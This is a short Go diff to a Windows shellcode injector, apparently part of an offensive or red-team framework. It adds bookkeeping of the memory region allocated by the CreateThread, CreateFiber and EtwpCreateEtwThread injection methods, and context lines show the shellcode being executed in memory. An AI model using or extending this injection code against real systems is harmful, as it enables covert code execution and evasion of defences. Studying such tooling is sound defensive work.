@@ -22,7 +22,17 @@ type context64 = api.Context64
 
 // windowsInjector implements injection for Windows.
 type windowsInjector struct {
-	config *Config
+	config     *Config
+	lastRegion Region
+	hasRegion  bool
+}
+
+// InjectedRegion returns the base address and size of the region allocated
+// by the most recent successful self-process Inject (MethodCreateThread,
+// MethodCreateFiber, MethodEtwpCreateEtwThread). For cross-process methods
+// or before the first successful self Inject, returns (Region{}, false).
+func (w *windowsInjector) InjectedRegion() (Region, bool) {
+	return w.lastRegion, w.hasRegion
 }
 
 func newPlatformInjector(cfg *Config) (Injector, error) {
@@ -175,6 +185,8 @@ func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
 	api.ProcWaitForSingleObject.Call(hThread, 100)
 	windows.CloseHandle(windows.Handle(hThread))
 
+	w.lastRegion = Region{Addr: addr, Size: uintptr(len(encoded))}
+	w.hasRegion = true
 	return nil
 }
 
@@ -452,6 +464,8 @@ func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
 	// 4. Switch to shellcode Fiber (execution!)
 	api.ProcSwitchToFiber.Call(shellcodeFiber)
 
+	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
+	w.hasRegion = true
 	return nil
 }
 
@@ -487,6 +501,8 @@ func (w *windowsInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
 		return fmt.Errorf("EtwpCreateEtwThread failed")
 	}
 
+	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
+	w.hasRegion = true
 	return nil
 }
 
